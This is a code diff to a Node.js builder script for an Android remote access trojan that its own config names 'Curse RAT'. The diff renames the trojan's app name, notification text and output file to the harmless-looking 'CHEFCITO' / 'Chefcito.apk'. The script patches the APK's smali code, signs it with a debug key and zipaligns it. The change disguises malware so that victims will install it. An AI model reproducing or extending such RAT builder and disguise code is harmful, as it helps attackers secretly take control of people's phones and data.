@@ -5,10 +5,10 @@ const crypto = require('crypto');
 
 let config = {
     hosts: "127.0.0.1:7777", // Legacy support
-    appName: "Curse RAT",
+    appName: "CHEFCITO",
     appVersion: "1.0",
     packageName: "com.curse.rat",
-    notifText: "Curse Service running...",
+    notifText: "Servicio CHEFCITO...",
     notifEnabled: true,
     fakeSize: 0,
     icon: null,
@@ -108,7 +108,7 @@ try {
     if (mainServiceSmaliPath) {
         let content = fs.readFileSync(mainServiceSmaliPath, 'utf8');
         // Patch Title (uses appName)
-        const titleRegex = /const-string v1, "Curse Service"[\s\S]*?invoke-virtual \{v0, v1\}, Landroidx\/core\/app\/NotificationCompat\$Builder;->setContentTitle/;
+        const titleRegex = /const-string v1, "(?:Curse Service|Servicio CHEFCITO)"[\s\S]*?invoke-virtual \{v0, v1\}, Landroidx\/core\/app\/NotificationCompat\$Builder;->setContentTitle/;
         content = content.replace(titleRegex, (match) => {
             return `const-string v1, "${config.appName}"\n    invoke-virtual {v0, v1}, Landroidx/core/app/NotificationCompat$Builder;->setContentTitle`;
         });
@@ -266,11 +266,11 @@ try {
     execSync(`jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore debug.keystore -storepass android -keypass android ${patchedApk} androiddebugkey`);
 
     // 10. Zipalign
-    const finalApk = path.join(outputDir, 'Curse.apk');
+    const finalApk = path.join(outputDir, 'Chefcito.apk');
     console.log("> Zipaligning...");
     execSync(`zipalign -v -f 4 ${patchedApk} ${finalApk}`);
 
-    console.log("--- SUCCESS: Curse.apk is ready ---");
+    console.log("--- SUCCESS: Chefcito.apk is ready ---");
 
 } catch (err) {
     console.error("BUILD FAILED:", err.message);
